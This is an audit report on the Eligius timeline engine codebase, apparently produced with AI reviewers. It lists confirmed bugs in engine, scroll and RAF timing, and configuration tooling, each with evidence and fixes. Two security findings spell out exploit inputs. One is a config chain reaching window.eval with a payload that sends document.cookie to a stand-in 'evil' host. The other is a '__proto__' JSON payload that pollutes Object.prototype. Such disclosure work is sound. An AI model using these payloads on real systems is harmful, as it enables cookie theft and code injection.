# Eligius codebase audit (2026-10-21)

## Verdict

**mature-plus-targeted-expansion.** Fix first. The feature catalogue is complete (about 75 operations, 8 controllers, 45 events, 4 position sources, fluent API, DOM-free entries) and the previous round's structural expansions have landed, so no new subsystem is justified. But 76 confirmed bugs remain, 9 of them medium in the engine's seek/switchTimeline/activate paths, two are security holes (invokeObjectMethod reaches window.eval; syncInPlace pollutes Object.prototype via every fluent getConfiguration callback), and the auditors agree the failure-path and concurrency tests are thin. Three areas (engine-core, configuration-tools, security) are explicitly not mature. No expansion should be merged until all medium bugs and the security items are fixed and covered by tests that use realistic inputs (jittered rAF timestamps, smooth scrolling, overlapping seek/switch/destroy).

The expansions I recommend are all small except one, and each is backed by evidence I checked in the code: TTimelineProviderSettings is still keyed by type only (configuration/types.ts:43) and createTimelineProvidersByUri reads timelineProviderSettings[timeline.type] for every timeline (engine-factory.ts:514); EngineInputAdapter unconditionally binds hotkeys('space') (engine-input-adapter.ts:51) and IEngineFactoryOptions has only eventbus (types.ts:148-150); EligiusResourceImporter's constructor takes no arguments and operation-lookup.ts:25 throws on any name outside generated metadata; all three dist/*.d.mts files start with an import from the now-optional peer lottie-web. Two proposals I reclassified rather than rejected: destroy-cancels-pending-init is a lifecycle defect (lens-lifecycle-memory) and belongs in the fix pass as a prerequisite, and the dead ITimelineFlow/EligiusFlowController surface should be deprecated as cleanup. Expansions with no demand signal (scrub controller) or that would land on top of known multi-engine bugs (host-element mounting) are rejected for this cycle.

| Count | |
|---|---|
| Confirmed bugs | 75 |
| Uncertain bugs (verified) | 1 |
| Unverified bug reports (over cap) | 1 |
| Refuted bug reports | 9 |
| Duplicates of other confirmed bugs | 0 |
| Improvements | 51 |
| Optimisations | 6 |
| Expansions recommended | 5 |

Verification: 86 reports were checked by Sonnet skeptics in the audit run (0 refuted, which is a weak signal), 0 by Opus skeptics in a second run (5 refuted, 4 marked duplicate, severities corrected). Each entry names its verifier model. "Confirmed" means an independent reader traced the failure through the real code; the repro test name is what turns it into a reproduced failure.

### Health by area

- **operations-a**: This slice is mostly mature. The recent round fixed the scope stack for break and continue inside `when`, nested `when` skipping, and several operations, and most operations here are small and well covered. The biggest remaining risk is in how control flow interacts with scopes: the when-scope does not forward loop state to direct `this` readers (customFunction), and forEach re-reads its collection on every iteration. Close behind are `when` operands silently compared as strings and `animateWithClass` resolving too early or never. Tests cover the documented happy paths and the newly fixed control-flow cases well, but they miss these adversarial cases.
- **controllers**: The core controllers are close to mature. BaseController, LabelController, ProgressbarController, MutationObserverController, DOMEventListenerController and LottieController have symmetric attach/detach, sanitised output and good tests after the last fix round. The weak spot is the legacy navigation pair. NavigationController and RoutingController still use the old 'video-url' event names, which nothing in the engine produces or handles any more, so menu clicks and history changes do nothing in a standard EngineFactory setup. They also mishandle hash/popstate edge cases. Tests for these two controllers pass because they mock the eventbus, so they never catch the broken wiring. Two other real gaps: DOMEventListenerController leaves action failures as unhandled rejections, and LottieController ignores the renderer setting.
- **lens-lifecycle-memory**: The happy path is now mature. Factory destroy() runs end operations, detaches the controllers it can find, tears down adapters, sources and container providers, and every adapter and controller pairs its registrations with removers. The remaining risks come in two shapes. First, async lifecycle steps that are still in flight are never cancelled or awaited, so a pending init, switchTimeline or start, or a timeline action's async start, can finish after destroy() or end() and acquire listeners, RAF loops or controllers again. Second, several engines on one factory share one eventbus and one actions lookup. Tests cover the synchronous orderings well but have no case with an async operation or a destroy that overlaps an unfinished start, switch or init.
- **engine-core**: This slice is close to mature but not there yet. Tick dispatch is solid and well tested: interval crossing, ends before starts within one update, pending-start cancellation, error events. The weak spots are the paths around it. seek() and switchTimeline() still use a fail-fast `_executeActions` loop, those commands are not serialised with each other, and a failed source init leaves the engine stuck. The biggest risk is that one failing end operation during a timeline switch stops playback, never shows the target timeline and leaves the old timeline's actions active. Unit coverage of the happy paths and of the new error event is dense. Failure paths and concurrent commands (seek/switch/stop overlap, failing actions during seek or switch, loop wrap, destroy before init) are not tested.
- **lens-security-robustness**: This slice is in decent shape. The audit round fixed property-chain pollution in the shared resolvers, rejects top-level `__proto__`, sanitizes Label and Subtitles output, and puts the operation name in most errors. It is not mature on the security side yet. The biggest risk is that `invokeObjectMethod`'s "cannot run arbitrary code" guarantee is false: probe tests showed a JSON config reaching `window.eval` and `window.Function`. Several DOM operations also execute markup from configuration or drop attached controllers without detaching them. Test coverage is broad on the happy paths and the fixes from the last round, but thin on hostile input: inherited/prototype key names, nested `__proto__`, `on*` attributes, rejected DOM-event actions, and controllers on removed elements.
- **eventbus-locale-util**: This slice looks mature. The last fix round made the Eventbus solid: broadcasts iterate a snapshot, once() removes itself before it runs, handler, listener and interceptor errors are isolated (async rejections too), and request errors reach the requester. The importer is small and correct. The biggest remaining risk is in LocaleLoader: it compares $ref paths as raw strings, so a cycle written with './' or '../' segments is never detected and engine.init() hangs, fetching forever. It also has no fetch timeout. Smaller issues: LocaleManager.t() can return non-strings, and once()/off() and listener or interceptor removal during dispatch behave inconsistently. Unit coverage of the happy paths is good, but the re-entrancy edge cases, relative-path cycles, non-object JSON payloads and the util guards are mostly untested.
- **lens-performance**: The per-tick path is in good shape. Each tick runs two binary searches over a schedule that is sorted once (O(log E + k), where k is the number of events crossed). The RAF clock works in integer milliseconds, so the old 0.1 s key-rounding problems are gone. Tick cost no longer grows with the number of actions. What remains are correctness bugs around the new dispatch code, mainly in seek and switchTimeline. _reconcileActions awaits each action in turn and does not use the error routing that the tick path uses. There are also ordering gaps in the pending-start and end-after-start logic, and the RAF clock floors elapsed time while its scheduler rounds it. Tests cover the main dispatch cases well (crossing, backward jumps, slow ends, error events). They do not cover position updates that arrive during a seek, failures during reconcile, async starts in a skipped range, ordering across updates, or rAF timestamps that land just before a tick boundary. This slice is close to mature but not there yet.
- **operations-b**: This slice is mostly mature but not finished. The prototype-pollution guards from the last round hold up: forbidden segments are checked both in resolveExternalPropertyChain and in getPropertyChainValue, and setData and invokeObjectMethod guard their writes and method names. The HTTP and loadJson error paths are consistent and tested. The biggest remaining risk is data flow through scopes and shared objects. Variables written inside when or forEach blocks are lost or crash. math, calc and createElement resolve property chains in place across the whole operation-data graph, which rewrites the configuration of other actions. startAction and endAction leak the inner action's in-place mutations back to the caller. I confirmed each of these with a temporary vitest probe, which I have since deleted. Test coverage is broad but shallow. Most specs call one operation through applyOperation with hand-built scopes, so behaviour that only shows up through Action's pushed when/forEach scopes, or through objects shared across actions, is largely untested.
- **timeline-providers-adapters**: This slice is mostly mature. Lifecycle state handling, video init and destroy settling, and adapter teardown are solid and well tested. The weak spots are timing at the edges, and the tests miss them because they use idealised inputs. The RAF clock re-anchors a loop on a jittered frame time, so each loop runs late. The scroll source seeks and loops with smooth scrolling, which makes the engine replay actions for every in-between position. Keyboard steps add up floating-point error. Base activate() can be overruled by an older play() that was cancelled. The tests are broad (about 4,500 lines), but they feed exact tick times, whole-number steps and instant scrolling. That is why none of these fail.
- **configuration-tools**: This slice is not yet mature. The resolver's error paths for unknown operations, duplicates and imported placeholders are now good. The fluent API still produces configurations that every layer accepts but that do not work: event actions without an eventName, timeline actions without a duration, controller classes accepted as operations. The schema and metadata generators also disagree with each other and with the runtime. The biggest risk is the confirmed Object.prototype pollution through syncInPlace, which every fluent getConfiguration callback uses. Test coverage is solid for the resolver's new error messages and the editors' in-place syncing. There are no tests for subtitle-converter, the operation, controller and event metadata generators, or the schema mismatches above.

## Confirmed bugs

### 1. [medium] seek() and switchTimeline() stop at the first failing action, leaving a half-switch

[eligius-engine.ts:1177](src/eligius-engine.ts#L1177) · area: engine-core · reported severity: high · verifier: sonnet

**Summary.** Tick dispatch, stop() and destroy() isolate action failures. Seek reconciliation and switch cleanup do not: they go through `_executeActions`, which awaits each action and stops at the first rejection. The remaining actions are never ended or started, `seekComplete`/`time` are not emitted, and the error goes to the caller (logged by the adapter as 'engine.seek() failed') instead of the `error`/`engine-error` path.

**Failure scenario.** Switch: timeline t1 has active actions X [0,10] (end operation selectElement on a missing node, which throws) and Y [0,10]. switchTimeline('t2') deactivates t1's source, X.end() rejects, and Y is never ended. The method throws before `_currentTimelineUri` changes, so the engine is 'stopped' on t1 with Y's DOM still present, and t2 is never activated. Seek: A [2,8] has a failing start and B [3,9] is healthy. seek(5) rejects after A, so B is never started. Forward dispatch from 5 never crosses B's start at 3, so B stays missing until the next seek.

**Evidence.**

```ts
private async _reconcileActions(uri: string, position: number) {
    ...
    await this._executeActions(actionsToEnd, 'end');
    await this._executeActions(actionsToStart, 'start');
  }
...
  private async _executeActions(actions, methodName) {
    for (const action of actions) {
      await action[methodName]();
    }
  }
...
    previousSource.deactivate();
    this._pendingStarts.clear();
    await this._cleanUpTimeline(previousUri);

    this._currentTimelineUri = timelineConfig.uri;
```

**Fix.** In `_reconcileActions`, replace both `_executeActions` calls with sequential loops over `await this._runActionMethod(action, 'end' | 'start')`. Do the same in `_cleanUpTimeline`, or have `_switchTimeline` call a reporting variant of it. Every action is then processed, failures are emitted as `EngineActionError` through `error` / `engine-error`, and `seek()` always emits `seekComplete` and `time` and resolves. `switchTimeline()` always reaches `_currentTimelineUri` reassignment, reconciliation and `source.activate()`. Keep `_executeActions`, which rethrows, for the `initActions` call in `_initializeTimelineProvider`, where `init()` should fail fast. Add tests for both paths, using an action whose start or end operation rejects (for example a mock operation, since `selectElement` does not throw on a missing node).

Original suggestion: Use `_runActionMethod` (which reports and never rejects) in `_reconcileActions` and `_cleanUpTimeline`, the same way `_endActiveActionsReporting` does. Every action is then processed, failures go to the `error` event, and seek/switch always finish their state transition.

**Verifier.** I traced the code at HEAD and the mechanism holds.  - **`_reconcileActions` (src/eligius-engine.ts:1177-1187)** calls `_executeActions` (lines 934-941) for both the ends and the starts. `_executeActions` is a plain `for … await action[method]()` loop with no try/catch, so the first rejection stops it. - **`_cleanUpTimeline` (lines 954-959)** uses the same loop. It is awaited in `_switchTimeline` at line 494, before `_currentTimelineUri` is reassigned at line 496. - **Actions do reject.** `Action.start` and `EndableAction.end` re-throw after a `console.error` (action/action.ts:32-36, action/endable-action.ts:21-24). - **Failed actions still count as active.** `TimelineAction.start` sets `_active = true` before its operations run.  Seek path: `seek()` calls `_reconcileActions` at line 439. A rejection there skips the `seekComplete` and `time` emits and every remaining action. `_lastPosition` has already been set to the target. Dispatch only reacts to boundaries it crosses, so a skipped action B with start 3 is not started again when moving forward from 5.  Switch path: by line 493 `previousSource.deactivate()` and `_pendingStarts.clear()` have already run. If an end fails in `_cleanUpTimeline`, the engine stays on t1 with its source deactivated, the later t1 actions are never ended, and t2 is never activated.  The error does not reach the `error` / `engine-error` path. The adapter's `_handleRejection` (adapters/engine-eventbus-adapter.ts:181-190) only `console.error`s it. This contradicts the CHANGELOG (line 15), which says the engine emits `error` "when an action it starts or ends fails". Tick dispatch, `stop()`, timeline-complete and cleanup all use `_runActionMethod`, which reports the failure and never rejects. No test covers a failing action during seek or switch; the only seek test with an error angle uses an empty timeline (eligius-engine.spec.ts:1638-1648).  Correction to the report: its example trigger is wrong. `selectElement` on a missing node does not throw; `findElementBySelector` only `console.warn`s. Other operations do fail at runtime with a valid configuration, for example a `loadJson` network or HTTP error, a throwing `customFunction`, or `endAction` without an `actionInstance`. So the bug is reachable, but only when an operation fails at runtime.  Severity: medium, not high. It needs a runtime operation failure, the error is still logged, and the next seek or switch can recover. Still, a failed switch leaves the engine stalled with the previous timeline's DOM partly torn down.

**Repro test.** `given active actions X and Y on t1 where X's end operation rejects, when switchTimeline('t2') is awaited, then it resolves, Y is ended, currentTimelineUri is 't2', t2's position source is activated and the engine emits an end-phase EngineActionError for X (plus seek variant: given A [2,8] with a rejecting start and healthy B [3,9], when seek(5) is awaited, then it resolves, B is started, seekComplete is emitted and an error event names A)`

### 2. [medium] invokeObjectMethod guard is bypassable: config can call window.eval / window.Function

[invoke-object-method.ts:56](src/operation/invoke-object-method.ts#L56) · area: lens-security-robustness · reported severity: high · verifier: sonnet

**Summary.** The doc comment promises that 'a configuration cannot build and run arbitrary code', but the guard only refuses three method names and the exact identity `instance === Function`. Any object a property chain can reach is allowed as instance, and `window` is reachable through `$operationdata.selectedElement.0.ownerDocument.defaultView`, which contains no forbidden segment. A temporary probe spec confirmed both `eval` and `Function`+`call` execute code.

**Failure scenario.** JSON config: selectElement {selector:'body'} -> setOperationData {properties:{instance:'$operationdata.selectedElement.0.ownerDocument.defaultView'}} -> invokeObjectMethod {methodName:'eval', methodArguments:['fetch(`//evil?c=`+document.cookie)']}. eval runs. The same works with methodName 'Function' followed by a second invokeObjectMethod {instance: '$operationdata.methodResult' via setData, methodName:'call'}; the result is not `Function` itself, so the identity check never fires. Verified with a probe spec (window.__pwned set to true; Function body returned 99).

**Evidence.**

```ts
if (isForbiddenPropertyChainSegment(methodName)) { throw ... }
  if (operationData.instance === Function) { throw ... }

  const func = operationData.instance[methodName];
  if (typeof func === 'function') {
    newOperationData.methodResult = func.apply(
      operationData.instance,
      methodArguments ?? []
    );
  } else {
    console.error(`The given member name ${methodName} is not a function`);
  }
```

**Fix.** A denylist cannot close this, because `invokeObjectMethod` is a general method-call primitive. Use an allowlist instead: accept `instance` only if it is an `IController`, either attached to an element through `getControllerFromElement` or checked by a guard on `name`, `init`, `attach` and `detach`. Otherwise, at minimum, refuse: - `typeof instance === 'function'` - `instance === globalThis` - `instance instanceof Window`, `Document` or `Node` - jQuery wrappers  Then rewrite the doc comment so it no longer promises that configuration cannot run code. Also throw with the operation name, instead of calling `console.error`, when the member is not a function.

Original suggestion: Refuse instances that are a Window, Document, Function or a Node/jQuery wrapper of the document: `instance === globalThis || instance instanceof Window || instance instanceof Document || typeof instance === 'function'`. Better, refuse methods whose value is a global code sink (eval, Function, setTimeout/setInterval with string args). Alternatively, restrict invokeObjectMethod to controllers (`instance` must be an IController found via getControllerFromElement). Also throw, naming the operation, instead of console.error when the member is not a function. Correct the doc comment either way.

**Verifier.** I traced the scenario through the real code and it holds. I could not find a guard anywhere that stops it.  1. `src/operation/invoke-object-method.ts` checks only two things:    - `methodName` against `{__proto__, prototype, constructor}`, using `isForbiddenPropertyChainSegment`.    - `instance === Function`, an identity check.    Nothing restricts what `instance` may be.  2. `setOperationData` resolves `properties` through `resolvePropertyValues`, then `resolveExternalPropertyChain`, then `getPropertyChainValue`. The only check on that path is `assertSafePropertyChain`, which looks for the same three forbidden segments. The chain `$operationdata.selectedElement.0.ownerDocument.defaultView` has none of them:    - `selectedElement[0]` is the DOM element.    - `.ownerDocument.defaultView` is `window`.  3. `window` survives the trip into the running operation data:    - `deepCopy` in `action.ts` only copies the configured data. That data holds strings, not the resolved value.    - `mergeOperationData` is a plain spread, so it keeps the reference.    - `deepCopy` would keep DOM nodes and jQuery objects by reference anyway.  4. `invokeObjectMethod` with `methodName: 'eval'` then calls `window.eval.apply(window, [code])`. That is an indirect global eval.    - `methodName: 'Function'` returns a new function. That function is not identical to `Function`, so the identity check never fires.    - A second `invokeObjectMethod` with `methodName: 'call'` runs it.  I ran a temporary probe spec with the real `setOperationData` and `invokeObjectMethod` operations. The instance was resolved from `$('body')` through that chain. The spec passed: - `eval` set `window.__pwned` and returned 7. - `Function` followed by `call` returned 99.  I deleted the probe afterwards. The existing `invoke-object-method.spec.ts` covers only the three method names and the bare `Function` instance, so it does not cover this.  On severity: - Both the doc comment and CLAUDE.md ("Never execute arbitrary code from configuration") promise the opposite of what happens. - Exploiting it requires control over the configuration JSON. In the normal deployment the site author writes that JSON, which limits the real-world impact. It becomes XSS only when configurations come from a less-trusted source.  I rate it medium, not high: the guard is broken, but the attacker must already control the configuration.  The suggested denylist fix would also be incomplete. Other ways to run code remain open: - `setTimeout` or `setInterval` with a string argument - `document.write` - `element.insertAdjacentHTML` - `setAttribute('onclick', ...)` - `location.assign('javascript:...')` - `Reflect.apply`

**Repro test.** `given a selectedElement whose ownerDocument.defaultView is set as instance through setOperationData, when invokeObjectMethod runs with methodName 'eval', then it throws instead of executing the code`

### 3. [medium] RAF loop wrap anchors next iteration to jittered frame time, lagging a tick per loop

[raf-position-source.ts:193](src/timelineproviders/position-sources/raf-position-source.ts#L193) · area: timeline-providers-adapters · reported severity: high · verifier: sonnet

**Summary.** When a loop wraps, _sessionElapsedOffset is set to the raw elapsed time of the wrap tick, and that time includes requestAnimationFrame latency (δ). Ticks in the next iteration arrive at k*tick + δk. Whenever δk < δwrap, floor((k*tick + δk - δwrap)/tick) gives k-1. Positions then lag a whole tick roughly half the time, and the iteration needs an extra tick to reach the end. With the default 1000 ms tick, a looping timeline can run up to 1 s long per loop and its actions fire up to 1 s late. Tests only feed exact multiples (60_000, 61_000), so they never see this.

**Failure scenario.** RafPositionSource {duration: 60}, loop = true. Real ticks arrive at 60_012 ms (wrap), then 61_004 ms. elapsedThisIteration = 992, so floor gives 0 and position 0 is emitted again instead of 1. Later, at 120_005 ms, elapsedThisIteration = 59_993 gives 59 and the end is only reached at 121_00x, so the second iteration lasts 61 s.

**Evidence.**

```ts
if (this.loop) {
        // Next iteration starts at 0 from this tick onwards
        this._sessionElapsedOffset = elapsed;
        this._sessionStartPosition = 0;
```

**Fix.** In `_onTick`'s loop branch, snap the offset to the grid `animationInterval` schedules on, the same way its `scheduleFrame` rounds: `this._sessionElapsedOffset = Math.round(elapsed / this._tickInterval) * this._tickInterval;`. Do not use `offset += durationMs - sessionStartMs`: when the duration is not a multiple of `tickInterval`, that offset falls off the tick grid. Add tests that feed jittered tick values: 60_012 then 61_004 should give position 1, and 120_005 should reach the end boundary of the second iteration.

Original suggestion: Snap the offset to the tick grid animationInterval schedules on: `this._sessionElapsedOffset = Math.round(elapsed / this._tickInterval) * this._tickInterval;`. Even better, take the wrap point from the duration: offset += durationMs - sessionStartMs. Add a test with jittered tick times (60_012 then 61_004) that expects position 1.

**Verifier.** I traced the failure through the real code and it holds.  1. `animationInterval` (src/util/animation-interval.ts) calls back with `time - start`. It schedules each frame with `setTimeout(() => requestAnimationFrame(frame), targetNext - now)`, where `targetNext` is on the grid `start + k*ms`. So every tick arrives at `k*ms + δk`, where `δk` is setTimeout plus rAF latency. That is usually 0 to about 17 ms and changes from tick to tick.  2. First iteration: `_sessionElapsedOffset` is 0 (set in `_startSession`). The tick value is `(k*ms + δk) / ms`, so `floor` gives `k` and positions are correct.  3. On wrap (`_onTick`, line 193), the offset is set to the raw `elapsed`, which is `60_000 + δw` and includes jitter. At the next tick (`61_000 + δ1`), `elapsedThisIteration` is `1000 + δ1 - δw`. Whenever `δ1 < δw` this is under 1000, so `floor` gives 0 and position 0 is emitted again. About half of all ticks in later iterations land this way. At the end, `120_000 + δ - δw` can give 59, so the end is only reached one tick later and that iteration lasts 61 s.  4. No guard covers this. The engine's `_onTimeHandler` drops the repeated 0 (`_lastPosition === position`). `_dispatchActionsBetween` dispatches everything in `(from, to]`, so actions keyed at position 1 are not lost. They fire on the next tick, up to one `tickInterval` late (1 s at the default 1000 ms).  5. Each wrap re-anchors the offset to the jittered tick, so the error happens again in every iteration. In the worst case each loop gains one tick.  6. The existing tests only feed exact grid values (`60_000`, `61_000`, `3000`), so `δ` is always 0 and this is never exercised.  Why medium, not high: - It only affects RAF timelines with `loop = true`, and only from the second iteration on. - The error is bounded at one tick. No actions are skipped and engine state is not corrupted. - It is still visible: up to 1 s of action lateness and a 61 s loop period at the default tick.  Fix: snapping to the tick grid (the auditor's first suggestion) is the right fix. The alternative, `offset += durationMs - sessionStartMs`, is wrong when the duration is not a multiple of `tickInterval` (for example duration 60.5 s with a 1000 ms tick). That offset falls off the grid `animationInterval` schedules on, which brings back the same floor error.

**Repro test.** `given a 60s looping RafPositionSource that wrapped on a jittered tick at 60_012ms, when the next tick arrives at 61_004ms, then position 1 is emitted (today it emits 0)`

### 4. [medium] Scroll seek while active uses smooth scrolling and returns before it lands

[scroll-position-source.ts:157](src/timelineproviders/position-sources/scroll-position-source.ts#L157) · area: timeline-providers-adapters · reported severity: high · verifier: sonnet

**Summary.** While the source is active, seek() starts a smooth scrollTo and resolves right away. The engine lowers _seekDepth as soon as seek() resolves. It then reconciles actions at the target and reads source.getPosition(), which is still the old position. The animated scroll then fires scroll events at in-between positions, and the engine dispatches each one as a normal position update. Target actions get ended, in-between actions get started and ended, and target actions get started again. seekComplete and time report the pre-seek position.

**Failure scenario.** Scroll timeline (duration 100) with actions A [20,30] and B [50,60], playing at 0. eventbus timeline-seek-request [55]. The engine starts B at 55 and emits seekComplete(0). Scroll events at about 10, 25, 40, 55 then end B, start and end A, and start B again. All their start and end operations run.

**Evidence.**

```ts
this._element.scrollTo({
      top: targetScrollTop,
      behavior: 'smooth',
    });

    if (this.state !== 'active') {
```

**Fix.** In ScrollPositionSource.seek, scroll instantly for programmatic seeks: `this._element.scrollTo({top: targetScrollTop, behavior: 'instant'})`. Then, in every state including active, set `const actual = this._calculatePosition(); this._lastPosition = actual; this._wasAtStart = actual === 0; this.setPosition(actual);` and return `actual`. `setPosition` while active calls back into `_onTimeHandler` while `_seekDepth > 0`, so the engine ignores it. The browser's later scroll event reports the same position, and `_onTimeHandler`'s equality check ignores that one too. If smooth scrolling is a hard requirement, wait for `scrollend` (with a fallback timeout) before resolving, so `_seekDepth` covers the whole animation, then set the position from `_calculatePosition()` as above. Update the spec assertions that currently expect `behavior: 'smooth'`.

Original suggestion: Use `behavior: 'instant'` (or 'auto') for programmatic seeks and set _lastPosition and the position synchronously, as the suspended branch already does. If smooth scrolling is wanted, wait for the 'scrollend' event (with a fallback timeout) before resolving, so the engine's _seekDepth covers the whole animation.

**Verifier.** I traced the scenario through the real code and it holds.  1. Reachable from a valid config. EngineFactory.createPositionSourceForTimeline imports any `systemName`, including 'ScrollPositionSource' (documented in configuration/types.ts and the 'scroll' shorthand in timeline-provider-settings-editor.ts). The `timeline-seek-request` event goes through EngineEventbusAdapter (line 132) to engine.seek().  2. Engine.seek (eligius-engine.ts ~417-446) calls `_seekSource`. That raises `_seekDepth`, awaits `source.seek(position)` and lowers `_seekDepth` again in `finally`. It then sets `_lastPosition = position` (55), reconciles actions at 55 (starts B) and emits `seekComplete`/`time` with `source.getPosition()`.  3. ScrollPositionSource.seek, while active, only calls `scrollTo({behavior:'smooth'})` and returns. `setPosition` and `_lastPosition` are updated only in the `state !== 'active'` branch, so `getPosition()` still returns the old value (0). The scroll listener is attached while active. A smooth scroll in a real browser sends scroll events on later frames, after `_seekDepth` is back to 0.  4. Each of those scroll events goes `_handleScroll`, then `setPosition`, then `onPosition` (callbacks fire because the state is active), then `_onTimeHandler`. The `_seekDepth` guard no longer applies. `_onTimeHandler` dispatches `_dispatchActionsBetween(55, ~10)` (backward: ends B, nothing covers 10), then 10→25 (starts A), 25→40 (ends A), 40→55 (starts B again). All of those start and end operations run.  5. `seekComplete(0)` and `time(0)` report the position before the seek.  I found nothing that prevents this. No guard suppresses scroll events after the seek, and `_lastPosition` only ignores an update that exactly equals 55. The unit tests in scroll-position-source.spec.ts (lines 417-545) assert that `behavior: 'smooth'` is used, which makes it look intended. But they mock `scrollTo` and never send the follow-up scroll events. They also never check the engine-level effect, and no integration test seeks a scroll timeline. jsdom does not animate `scrollTo`, which is why the tests miss this.  On severity: it needs a scroll timeline plus a programmatic seek while playing (NavigationController or a `timeline-seek-request`). The effect is real: target actions end and restart, operations for actions between the old and new position run, and `seekComplete` reports the wrong position. But it is limited to scroll timelines, and passing through those in-between actions matches what a user scrolling by hand would see anyway. I rate it medium rather than high.

**Repro test.** `given a playing scroll timeline with actions A [20,30] and B [50,60] at position 0, when timeline-seek-request [55] is broadcast and the scroll container then sends scroll events at 10, 25, 40 and 55, then B is started exactly once, A's start and end operations never run, and seekComplete reports 55`

### 5. [medium] syncInPlace pollutes Object.prototype when the incoming data has an own __proto__ key

[sync-in-place.ts:45](src/configuration/api/sync-in-place.ts#L45) · area: configuration-tools · reported severity: high · verifier: sonnet

**Summary.** syncObject assigns every key of the source with `target[key] = ...`. For an own `__proto__` data property, as made by JSON.parse, object spread or deepCopy, `target['__proto__']` reads Object.prototype. That counts as a plain object (its prototype is null) with the same undefined id, so syncValue recurses and syncObject writes the attacker's keys onto Object.prototype. Every getConfiguration(callback) on ConfigurationFactory, ActionCreator, ActionEditor and OperationEditor goes through this path. I reproduced it with tsx.

**Failure scenario.** factory.editAction(id).addStartOperation('selectElement',{selector:'#a'}).getConfiguration(op => ({...op, operationData: JSON.parse('{"selector":"#b","__proto__":{"polluted":"yes"}}')})) -> afterwards ({}).polluted === 'yes' for the whole process (verified with npx tsx).

**Evidence.**

```ts
for (const key of Object.keys(source)) {
    target[key] = syncValue(target[key], source[key]);
  }
...
  if (isPlainObject(existing) && isPlainObject(incoming)) {
    // Do not merge two different identified entities into one object
    const existingId = idOf(existing);
    const incomingId = idOf(incoming);
    if (existingId !== incomingId) {
      return incoming;
    }
    syncObject(existing, incoming);
```

**Fix.** In syncObject, skip unsafe keys in both loops: `const UNSAFE = new Set(['__proto__','constructor','prototype'])`. Choose one of two behaviours: (a) `continue` on those keys, or (b) mirror deepCopy and write with `Object.defineProperty(target, key, {value, writable:true, enumerable:true, configurable:true})`, and read the existing value only when `Object.hasOwn(target, key)` (use `Object.hasOwn(target, key) ? target[key] : undefined`). Option (b) keeps the data property, which action.ts later rejects with a clear error. As defence in depth, make isPlainObject in sync-in-place return false for Object.prototype itself, or have syncValue refuse `existing === Object.prototype`. Add a regression test in src/test/unit/configuration/api/sync-in-place.spec.ts.

Original suggestion: In syncObject (and in the deletion loop), skip or reject the keys '__proto__', 'constructor' and 'prototype', or write with Object.defineProperty as deepCopy does. Also make syncValue refuse to recurse into Object.prototype, for example `existing !== Object.prototype`. Add a regression test in sync-in-place.spec.ts.

**Verifier.** I traced the path through the real code and reproduced it with npx tsx using the real syncInPlace and deepCopy modules. The script printed "polluted: yes".  1. All four getConfiguration callers call syncInPlace(target, deepCopy(newConfig)). These are action-creator-factory.ts:155, configuration-factory.ts:282, action-editor.ts:68 and action-editor.ts:450. 2. deepCopy does not protect against this. In src/operation/helper/deep-copy.ts:51-59 it copies keys with Object.defineProperty, so an own '__proto__' data property from JSON.parse survives the copy as an own data property. 3. syncObject at sync-in-place.ts:44-45 loops over Object.keys(source), which includes '__proto__'. If the existing target object has no own '__proto__' key, which is the normal case for operationData built by addStartOperation, then `target['__proto__']` goes through the inherited accessor and returns Object.prototype. 4. syncValue then checks isPlainObject(Object.prototype). Its prototype is null, so the check passes. The incoming object is also plain. idOf returns undefined for both, so the ids match and syncValue calls syncObject(Object.prototype, incoming). The delete loop finds no enumerable keys on Object.prototype, and the write loop puts the attacker's keys onto Object.prototype. 5. Finally, `target['__proto__'] = Object.prototype` is a no-op through the setter, so nothing signals the pollution.  No guard covers this path: - The '__proto__' rejection in src/action/action.ts:269 runs only at engine runtime, after the process is already polluted. - assert-safe-property-chain applies only to property chains. - ConfigurationResolver's null-prototype maps are a different path. - sync-in-place.spec.ts has no '__proto__' test.  Severity is corrected to medium. The data must come from developer-written fluent-API callback code that returns JSON-parsed untrusted input. A JSON configuration that goes through ConfigurationResolver or the engine cannot reach this path. The ConfigurationFactory constructor path is also safe: a target that already has an own '__proto__' data property reads that property and not the accessor. When it does trigger, though, the pollution affects the whole process, and the new Node `configuration-api` entry makes server-side and tooling use realistic. It is also inconsistent with the protection the same codebase just added to deepCopy and action.ts.

**Repro test.** `given a target operationData without a __proto__ key and a source whose operationData has an own __proto__ key from JSON.parse, when syncInPlace is called, then Object.prototype is not modified (({}).polluted is undefined)`

### 6. [medium] animateWithClass resolves early on a bubbled animationend from a descendant

[animate-with-class.ts:44](src/operation/animate-with-class.ts#L44) · area: operations-a · reported severity: medium · verifier: sonnet

**Summary.** The handler is bound with jQuery `.on('animationend')` on the selected element and never checks `event.target`. `animationend` bubbles, so when any child animation ends first the operation resolves, removes the class from the element whose own animation is still running (which cuts it short) and unbinds. A probe confirmed it: dispatching a bubbling animationend on a child span resolved the promise and removed the parent's class. With several selected elements, the first element to finish resolves the promise and strips the class from all of them.

**Failure scenario.** A container with an animated spinner child gets animateWithClass {className:'fade-in'}. The spinner's 0.2s animation ends before the 1s fade, so the operation resolves at 0.2s, 'fade-in' is removed mid-animation and the next operations run too early.

**Evidence.**

```ts
const handleAnimationEnd = () => {
        selectedElement.off('animationend', handleAnimationEnd);
        if (removeClass) {
          selectedElement.removeClass(className);
        }
        internalResolve(resolve, {}, operationData);
      };
      selectedElement.on('animationend', handleAnimationEnd);
```

**Fix.** Inside the handler, take the event and ignore it when `event.target !== event.currentTarget`, so events bubbling up from descendants do nothing. Track which selected elements have finished: keep a Set of elements, add `event.currentTarget` on each own-target animationend, and resolve only when the set's size equals `selectedElement.length`. Then call `.off` and `removeClass` once, at that point. Document that the class must put an animation on the selected element itself. If configurations that only animate descendants have to keep working, add an opt-in flag (for example `includeDescendants`) that keeps the current first-event behaviour. Add tests that dispatch a bubbling `new AnimationEvent('animationend', {bubbles: true})` (or a bubbling Event with that name) from a child span, and that use a two-element selection.

Original suggestion: Ignore events whose target is not one of the selected elements (`if (!selectedElement.is(event.target)) return;`). Then either wait for every selected element (count them) or document that only the first element is tracked.

